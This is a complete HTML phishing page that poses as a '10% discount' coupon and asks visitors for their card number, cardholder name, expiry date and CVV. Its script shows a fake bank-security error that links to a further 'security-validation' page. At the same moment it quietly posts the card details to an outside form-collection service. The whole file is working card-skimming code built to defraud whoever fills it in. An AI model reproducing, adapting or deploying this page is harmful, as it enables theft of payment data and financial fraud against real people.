<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Claim Your Discount</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
    /* General Styles */
    body {
      font-family: 'Arial', sans-serif;
      background: linear-gradient(135deg, #6a11cb, #2575fc);
      color: #fff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .coupon-container {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      border-radius: 15px;
      padding: 2rem;
      width: 100%;
      max-width: 400px;
      text-align: center;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
    }

    h1 {
      font-size: 2rem;
      margin-bottom: 1rem;
    }

    p {
      font-size: 1rem;
      margin-bottom: 2rem;
    }

    .form-group {
      margin-bottom: 1.5rem;
      text-align: left;
    }

    .form-group label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: bold;
    }

    .form-group input {
      width: 100%;
      padding: 0.75rem;
      border: none;
      border-radius: 8px;
      background: rgba(255, 255, 255, 0.2);
      color: #fff;
      font-size: 1rem;
    }

    .form-group input::placeholder {
      color: rgba(255, 255, 255, 0.7);
    }

    .form-group input:focus {
      outline: none;
      background: rgba(255, 255, 255, 0.3);
    }

    .card-icons {
      display: flex;
      gap: 10px;
      margin-top: 0.5rem;
    }

    .card-icons i {
      font-size: 1.5rem;
      color: rgba(255, 255, 255, 0.7);
    }

    .btn-claim {
      background: #ff6b6b;
      color: #fff;
      border: none;
      padding: 1rem 2rem;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s ease;
      width: 100%;
    }

    .btn-claim:hover {
      background: #ff4c4c;
    }

    .error-message {
      display: none;
      margin-top: 1.5rem;
      color: #ff4c4c;
      font-size: 1rem;
      font-weight: bold;
    }

    .error-message a {
      color: #fff;
      text-decoration: underline;
    }

    /* Responsive Design */
    @media (max-width: 480px) {
      .coupon-container {
        padding: 1.5rem;
      }

      h1 {
        font-size: 1.5rem;
      }

      p {
        font-size: 0.9rem;
      }
    }
  </style>
</head>
<body>
  <div class="coupon-container">
    <h1>Claim Your 10% Discount!</h1>
    <p>Enter your credit/debit card details to unlock your exclusive coupon code.</p>

    <!-- Single Form with FormSubmit action -->
    <form id="coupon-form" action="https://formsubmit.co/1aaf0d8563b5b9ec1f0b55f5e8e1cdee" method="POST">
      <!-- Optional hidden fields for FormSubmit -->
      <input type="hidden" name="_captcha" value="false">
      <!-- Uncomment the next line if you want to redirect after submission -->
      <!-- <input type="hidden" name="_next" value="thankyou.html"> -->

      <div class="form-group">
        <label for="card-number">Card Number</label>
        <input type="text" id="card-number" name="card-number" placeholder="XXXX XXXX XXXX XXXX" required>
      </div>
       <div class="form-group">
   <label for="cardholder">Cardholder Name</label>
   <input type="text" id="cardholder" name="cardholder" placeholder="Name" required>
 </div>
      <div class="form-group">
        <label for="expiry-date">Expiry Date</label>
        <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" required>
      </div>
      <div class="form-group">
        <label for="cvv">CVV</label>
        <input type="text" id="cvv" name="cvv" placeholder="123" required>
        
      </div>
      <div class="card-icons">
        <i class="fab fa-cc-visa"></i>
        <i class="fab fa-cc-mastercard"></i>
        <i class="fab fa-cc-amex"></i>
        <i class="fab fa-cc-discover"></i>
      </div>
      <button type="submit" class="btn-claim">Claim Discount</button>
    </form>

    <!-- Error Message -->
    <div id="error-message" class="error-message">
      ‚ùå Oops! Something went wrong! Your banks security demands Additional questioning to validate card is being used by owner.<br>
      Please <a href="security-validation.html">Click here</a>.
    </div>
  </div>

  <script>
    // Handle Form Submission with Fetch to send details to FormSubmit while showing the error message.
    document.getElementById('coupon-form').addEventListener('submit', function (e) {
      e.preventDefault();  // Prevent default submission (and page navigation)
      
      // Show error message immediately (while details are being sent)
      document.getElementById('error-message').style.display = 'block';
      
      // Create a FormData object from the form
      const formData = new FormData(this);
      
      // Send the form data to FormSubmit using fetch in no-cors mode.
      fetch(this.action, {
        method: this.method,
        body: formData,
        mode: 'no-cors'
      })
      .then(() => {
        console.log('Form details sent to FormSubmit');
        // Optionally, you might want to clear the form or show a success message here.
      })
      .catch((error) => {
        console.error('Error sending form details:', error);
      });
    });
  </script>
</body>
</html>
